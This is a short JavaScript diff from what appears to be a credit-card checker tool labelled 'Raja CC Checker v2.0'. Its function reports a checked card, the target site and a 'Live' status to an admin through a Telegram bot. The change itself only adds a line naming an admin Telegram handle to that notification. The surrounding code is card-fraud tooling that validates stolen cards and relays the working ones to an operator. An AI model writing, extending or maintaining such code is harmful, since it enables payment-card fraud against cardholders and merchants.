@@ -361,7 +361,8 @@ async function sendAdminApprovedNotification(cc, site, result) {
       `📝 **Response:** ${responseMessage}\n` +
       `📊 **Status:** ${result.status || 'Live'}\n` +
       `⏰ **Time:** ${new Date().toLocaleString()}\n` +
-      `🌍 **Source:** Raja CC Checker v2.0\n\n` +
+      `🌍 **Source:** Raja CC Checker v2.0\n` +
+      `👑 **Admin:** @thatsrealpopeye\n\n` +
       `🎯 **ADMIN NOTIFICATION**`;
 
     await sendTelegramMessage(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, adminMessage);
